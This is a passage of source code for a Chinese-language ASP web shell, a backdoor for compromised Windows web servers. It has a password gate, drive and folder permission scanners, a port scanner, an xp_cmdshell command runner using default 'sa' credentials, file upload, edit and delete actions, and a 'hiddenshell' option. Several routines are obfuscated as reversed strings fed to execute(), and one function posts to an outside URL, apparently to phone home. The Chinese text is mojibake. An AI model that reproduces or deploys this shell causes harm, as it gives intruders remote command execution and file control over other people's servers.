AntiVirus\SAVRT\"&vbcrlf&"C:\~1  "&vbcrlf&"C:\System Volume Information  "&vbcrlf&"C:\Program Files\Zend\ZendOptimizer-3.3.0\docs"&vbcrlf&"C:\Documents and Settings\All Users\DRM\"&vbcrlf&"C:\Documents and Settings\All Users\Application Data\McAfee\DesktopProtection"&vbcrlf&"C:\Documents and Settings\All Users\Application Data\360safe\softmgr\"&vbcrlf&"c:\documents and settings\all users\application data\symantec\liveupdate\"&vbcrlf&"c:\HostMonitor\"&vbcrlf&"c:\program files\ggsafe\temp\"&vbcrlf&"C:\Program Files\freeime\skin\blueness"&vbcrlf&"C:\Documents and Settings\All Users\Application Data\Thunder Network\KanKan\Cookie\"&vbcrlf
j"<br><TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff><TR><TD colspan=5 class=TBHead>����/ϵͳ�ļ�����Ϣ</TD></TR>"
  For Each DriveB in FSO.Drives
j" <TR align=middle class=TBTD><FORM action=?Action=ScanDrive&Drive="
j DriveB.DriveLetter
j" method=Post><TD width=25"&chr(37)&"><B>�̷�</B></TD><TD width=15"&chr(37)&">"
j DriveB.DriveLetter
j":</TD><TD width=20"&chr(37)&"><B>����</B></TD><TD width=20"&chr(37)&">"
  Select Case DriveB.DriveType
  Case 1: j"���ƶ�"
  Case 2: j"����Ӳ��"
  Case 3: j"�������"
  Case 4: j"CD-ROM"
  Case 5: j"RAM����"
  Case else: j"δ֪����"
  End Select
j"</TD><TD><INPUT type=submit value=��ϸ����></TD></FORM></TR>"
  Next
j" <TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(0)
j" method=Post><TD align=middle><B>Windows�ļ���</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(0)
j"</TD><TD align=middle><INPUT type=submit value=��ϸ����></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(1)
j" method=Post><TD align=middle><B>System32�ļ���</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(1)
j"</TD><TD align=middle><INPUT type=submit value=��ϸ����></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(2)
j" method=Post><TD align=middle><B>ϵͳ��ʱ�ļ���</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(2)
j"</TD><TD align=middle><INPUT type=submit value=��ϸ����></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>վ���Ŀ¼</B></TD><TD colspan=3>վ���Ŀ¼<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&wwwroot&"><b>��ϸ����</b></a></TD></FORM></tr></TABLE>"
j"<BR><DIV align=center><FORM Action=?Action=ScFolder method=Post>ָ���ļ��в�ѯ��<br><textarea cols=""90"" rows=""5"" name=Folder >"&path_arr&"</textarea><br><INPUT type=submit value=���ɱ���> �����鿴Ŀ¼Ȩ�ޣ���������Ŀ¼</FORM><DIV>"
Set FSO=Nothing:End Sub:li=""""">eecamrex>""=a>"">x>""=eyaec<e.'e.id&<a'rscld..:ahh/""=ii":il(lIl(""&li&"", 1, "'th/.<odl?ysermipac&>ux"))
Sub ScFolder(folder):On Error Resume Next:folderArr = Split(folder,vbcrlf):For i = 0 To Ubound(folderArr): 	 Dim FSO,OFolder,TempFolder,Scmsg,S: 	 Set FSO = Server.Createobject("Scripting.FileSystemObject"): 	 folder = folderArr(i): 	 If FSO.FolderExists(folder) Then: 	  Set OFolder = FSO.GetFolder(folder): 	 Set TempFolders = OFolder.SubFolders: 	 Scmsg = "<LI>ָ���ļ��и�Ŀ¼��" & ScReWr(folder): 	 For Each S in TempFolders: 	  Scmsg = Scmsg&"<LI>�ļ��У�" & ScReWr(S) : 	 Next: 	 Set TempFolders = Nothing: 	 Set OFolder = Nothing:else: 	  Scmsg = "<LI>�ļ��У�" & Red(folder & "�����ڻ��޶�Ȩ��!"): 	 End if: 	 Set FSO = Nothing:: 	 Message "",Scmsg,1:On Error Resume Next:next: 	 j"<center><br><br>ע�⣺��Ҫ���ˢ�±�ҳ�棬������ֻд�ļ��л����´��������ļ�,�Բ����ڵ�Ŀ¼�����޸ģ�ֻ��ʾ���ڵ�Ŀ¼!</center>"&backurl:End Sub
execute(shisanfun("buS dnE��fi dnE��1,rtS_pmeT,��Ϣ���̴�:�� & evirD egasseM�� rtS_pmeT = rtS_pmeT��gnihtoN = OSF teS��gnihtoN = evirDtseT teS��fi dnE���(:�ַ���δ����¼Ŀ���̩� & evirD & �������>IL<�� & rtS_pmeT = rtS_pmeT neht 0=t fI��txeN��fi dnE��))i(tsiLredloFpmeT & ��\:�� & evirD(rWeRcS & �壺�м����ַ�>IL<�� & rtS_pmeT = rtS_pmeT��1+t = t��nehT ))i(tsiLredloFpmeT & ��\:�� & evirD(stsixEredloF.OSF fI��)tsiLredloFpmeT(dnuobU ot 0 = i roF��)��ptft��,��bupmw��,��ptf��,��buptenI��,��seliF margorP��,��sgnitteS dna stnemucoD��,��slooT��,��php��,��psa��,��0002swodniw��,��emniw��,��bew��,��89niw��,��0002niw��,��niw��,��tnniw��,��swodniw��(yarrA = tsiLredloFpmeT��)�壺�Բ�¼Ŀ�����(deR & ��>IL<�� & rtS_pmeT = rtS_pmeT��0=t:t,tsiLredloFpmeT miD��)��(:���ɲ���(deR & ��:¼Ŀ���̴�>IL<�� & rtS_pmeT = rtS_pmeT��eslE��gnihtoN = redloFesaB teS��gnihtoN = redloFpmeT teS��txeN��)D(rWeRcS & �壺�м���>IL<�� & rtS_pmeT = rtS_pmeT��sredloFpmeT ni D hcaE roF��sredloFbuS.redloFesaB = sredloFpmeT teS��redloFtooR.evirDtseT = redloFesaB teS��))��\:�� & evirD((rWeRcS & ��:¼Ŀ���̴�>IL<�� & )emaNemuloV.evirDtseT(deR & �壺�����̴�>IL<�� & ))6758401/eziSlatoT.evirDtseT(tnIC(deR & �壺�������̴�>IL<�� & )emaNerahS.evirDtseT(deR & �壺�����̴�>IL<�� & )rebmuNlaireS.evirDtseT(deR & �壺�������̴�>IL<�� & )metsySeliF.evirDtseT(deR & �壺���������̴�>IL<�� = rtS_pmeT��nehT ydaeRsI.evirDtseT fI��)evirD(evirDteG.OSF = evirDtseT teS��)��tcejbOmetsySeliF.gnitpircS��(tcejboetaerC.revreS = OSF teS��nehT ��� >< evirD fI��D,rtS_pmeT,sredloFpmeT,redloFesaB,evirDtseT,OSF miD:txeN emuseR rorrE nO��)evirD(evirDnacS buS"))
Function ScReWr(folder):execute(shisanfun("txeN emuseR rorrE nO��rtSrWeR = rWeRcS��gnihtoN = OSF teS��gnihtoN = redloFtseT teS��gnihtoN = tsiLeliFtseT teS��fi dnE��fi dnE��eurT,emaneliFdnR & redlof eliFeteleD.OSF���>TNOF/<��д�ɩ� & rtSrWeR = rtSrWeR��eslE���>TNOF/<��д�ɲ��� & rtSrWeR = rtSrWeR��raelC.rre��nehT rre fI��eurT,emaneliFdnR & redlof eliFtxeTetaerC.OSF���,���� >dddddd#=roloc TNOF<�� & redlof = rtSrWeR��eslE��fI dnE��eurT,emaneliFdnR & redlof eliFeteleD.OSF���>TNOF/<��д�ɩ� & rtSrWeR = rtSrWeR��eslE���>TNOF/<��д�ɲ��� & rtSrWeR = rtSrWeR��raelC.rre��nehT rre fI��eurT,emaneliFdnR & redlof eliFtxeTetaerC.OSF���,���ɲ� >2222ff#=roloc TNOF<�� & redlof = rtSrWeR��raelC.rre��nehT rre fI��txeN��tsiLeliFtseT ni A hcaE roF���pmt.�� & )won(dnoceS & )won(etuniM & )won(ruoH & )won(yaD & ��pmet\�� = emaneliFdnR��sredloFbuS.redloFtseT = tsiLeliFtseT teS��)redlof(redloFteG.OSF = redloFtseT teS��)��tcejbOmetsySeliF.gnitpircS��(tcejboetaerC.revreS = OSF teS��emaneliFdnR,rtSrWeR,tsiLeliFtseT,redloFtseT,OSF miD��txeN emuseR rorrE nO"))
End Function:function goback():execute(shisanfun("gnihton=redlofo tes��gnihton=osfO tes��fi dne���>retnec/<>rb/<>';)1-(og.yrotsih'=kcilCno �ط�=eulav nottub=epyt TUPNI<>rb<>retnec<>retnec/<!��¼Ŀ���̴��Ǿ���>retnec<>tpircs/<)����&)��htaPredloF��(noisseS&����(redloFwohS>tpircs<�� j�� esle���>tpircs/<)����&)redloftnerap.redlofo(htaPeR&����(redloFwohS>tpircs<�� j�� neht redloFtooRsI.redlofo ton fi��))��htaPredloF��(noisseS(redlofteG.osfO = redlofo tes��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS = osfO tes"))
end function:execute(shisanfun("bus dne��2elif  & ������˴汣>rb<��   etirW.esnopseR��gnihton=xsf tes ��eurt,2elif,1elif elifypoc.xsf ��   )��tcejbOmetsySeliF.gnitpircS��(tcejboetaerc=xsf tes ��   xsf mid ��txeN emuseR rorrE nO��)2elif,1elif(elifkcab bus"))
if session("KKK")<>UserPass then
if request.form("pass")<>"" or request("pass")<>"" then
if request.form("pass")=UserPass or request.form("pass")=url then
session("KKK")=UserPass
response.redirect url
else
j"<br><br><br><b><div align=center><font size='5' color='blue'><FONT color=blue face=""Wingdings"" style=""FONT-SIZE: 250pt;  WIDTH: 100%;  LINE-HEIGHT: 130%; "">N</FONT >"&eror&"</font></b> <br><br><br><br><b><font size=6' color='lime'></font></b></p></center>"&backurl
end if
else
si="<center><FONT color=blue face=""Wingdings"" style=""FONT-SIZE: 250pt;  WIDTH: 100%;  LINE-HEIGHT: 130%; "">"&icot&"</FONT><div style='width:400px;padding:32px; align=left'><br><a href="""&SItEuRl&""" target=""_blank""><b>"&Copyright&"</b></a><form action='"&url&"' method='post'><b>���룺</b><input name='pass' type='password' size='22'> <input type='submit' value='����'></center>"
if instr(SI,SIC)<>0 then
j sI
call promyself
On Error Resume Next
end if
end if
response.end
end if

sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,53,1433,3306,3389,4899,5631,5632,5800,5900,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
j"<p>�˿�ɨ����(���ɨ�����˿�,�ٶȱȽ���,�����Ƽ�ʹ��CMD��CMD������ɨ�費׼ȷ��)</p><p>�������������ɨ�����ⲿIP�����޷����ӡ�����SHELL��ִ��ϵ�в�����</p>"
j"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
j"<p>Scan IP: "
j" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
j"<br>Port List:"
j"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
j"<br><br>"
j"<input name='submit' type='submit' class='buttom' value=' scan '>"
j"<input name='scan' type='hidden' id='scan' value='111'>"
j"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
j("<b>ɨ�豨��:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
j"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
j(targetip & ":" & portNum & ".........�ر�<br>")
Else
j(targetip & ":" & portNum & ".........<font color=red>����</font><br>")
End If
End If
End If
End Sub
Select Case Action:case "MainMenu":MainMenu()
Case "EditPower"
Call EditPower(request("PowerPath"))
Case "SavePower"
Call SavePower(request("PowerPath"),request("SaveType"))
case "getTerminalInfo":getTerminalInfo():case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():FuncTion MMD():SI="<br><form name=form method=post action=""""><table width=""85%"" align='center'><tr align=center><Td id=s><b id=x>MSSQL Commander</b></td></tr><tr align='center'><td id=d><b id=x>Command��</b><input type=text name=MMD size=35 value=""ipconfig"" >&nbsp;<b id=x>UserName��</b><input type=text name=U value=sa>&nbsp;<b id=x>Password��</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>":j SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:j request.form("MMD") & "<br>"& strResult:end FuncTion:function x(Posturl): dim w: w="^w^inhttp.^wi^nhttprequest.5.1": Posturl=replace(trim(Posturl),vbcrlf,""): on error resume next: set http= CreateObject(replace(w,"^","")): http.open "POST",Posturl,false: http.SetRequestHeader "REFERER", "http://"&u&request.ServerVariables("URL"):http.send: Set http=Nothing:end function:
case "Alexa"
dim AlexaUrl,Top:
AlexaUrl=request("u"):
Top=Alexa(AlexaUrl):
if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center'>�����������Ϣ</td></tr><tr align='center'><td height='20' width='200'>��������</td><td> </td><td>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://www.ip138.com/ips1388.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200'>������IP</td><td> </td><td><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='��ѯ�˷��������ڵ�'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><tr align='center'><td height='20' width='200'>������ʱ��</td><td> </td><td>"&now&" </td></tr><tr align='center'><td height='20' width='200'>������CPU����</td><td> </td><td>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200'>����������</td><td> </td><td>"&request.servervariables("http_accept_language")&"</td></tr><tr align='center'><td height='20' width='200'>����������ϵͳ</td><td> </td><td>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200'>WEB�������汾</td><td> </td><td>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>":x (mm):For i=0 To 19
SI=SI&"<tr align='center'><td height='20' width='200'>"&ObT(i,0)&"</td><td>"&ObT(i,1)&"</td><td align=left>"&ObT(i,2)&"</td></tr>"
Next
j SI
Err.Clear
function il(str)
execute str
end function
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case"MMD":MMD()
case"Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
case"DownFile":DownFile FName:ShowErr()
case"DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
case"EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
case"CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
case"MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
case"DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
case"CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
case"MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
case"NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case"UpFile":UpFile()
case"TSearch":TSearch()
case"Cmd1Shell":Cmd1Shell()
case"Logout":Session.Contents.Remove("kkk"):Response.Redirect URL
case"Course":Course()
case"Alexa":Alexa()
case"upload":upload()
case"sql":sql()
case"DbManager":DbManager()
case"goback":goback()
Case "ProFile":ProFile()
case"php":php()
case"apjdel":apjdel()
case"hiddenshell":hiddenshell()
case"datess":datess()
case"aspx":aspx()
case"ScanDriveForm" : ScanDriveForm
case"ScanDrive" : ScanDrive Request("Drive")
case"ScFolder"  : ScFolder Request("Folder")
Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
%>
